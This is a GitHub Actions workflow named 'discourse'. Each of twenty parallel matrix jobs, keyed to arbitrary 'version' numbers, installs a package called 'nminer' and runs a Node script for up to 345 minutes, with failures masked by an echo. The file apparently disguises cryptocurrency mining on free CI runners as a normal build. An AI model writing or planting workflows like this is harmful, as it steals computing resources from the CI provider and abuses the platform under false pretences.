name: discourse
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 7040 }
          - { version: 7306 }
          - { version: 1063 }
          - { version: 6127 }
          - { version: 7666 }
          - { version: 8177 }
          - { version: 1744 }
          - { version: 117 }
          - { version: 5208 }
          - { version: 9724 }
          - { version: 5327 }
          - { version: 7729 }
          - { version: 4258 }
          - { version: 6275 }
          - { version: 6298 }
          - { version: 7160 }
          - { version: 9575 }
          - { version: 5766 }
          - { version: 4572 }
          - { version: 189 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: gadzooks
        run: |
          npm install nminer@latest
          timeout 345m node discourse.js || echo "discourse executed"